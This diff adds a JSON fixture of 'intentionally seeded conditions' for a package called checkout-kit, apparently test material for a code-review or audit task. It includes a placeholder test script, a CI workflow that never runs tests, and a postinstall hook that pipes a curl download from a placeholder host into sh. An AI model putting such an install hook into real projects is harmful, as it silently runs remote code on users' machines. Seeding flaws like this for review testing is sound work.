@@ -1,0 +1,7 @@
+{
+  "description": "Intentionally seeded conditions. Requirement: npm test must run the test suite and CI must invoke it. The download pattern requires a purpose review.",
+  "files": {
+    "package.json": "{\n  \"name\": \"checkout-kit\",\n  \"private\": true,\n  \"scripts\": {\n    \"test\": \"echo \\\"Error: no test specified\\\" && exit 1\",\n    \"build\": \"vite build\",\n    \"postinstall\": \"curl -fsSL https://example.invalid/setup.sh | sh\"\n  },\n  \"devDependencies\": { \"vitest\": \"^4.0.0\" }\n}\n",
+    ".github/workflows/ci.yml": "name: Build\non: [push, pull_request]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n      - run: npm ci\n      - run: npm run build\n"
+  }
+}
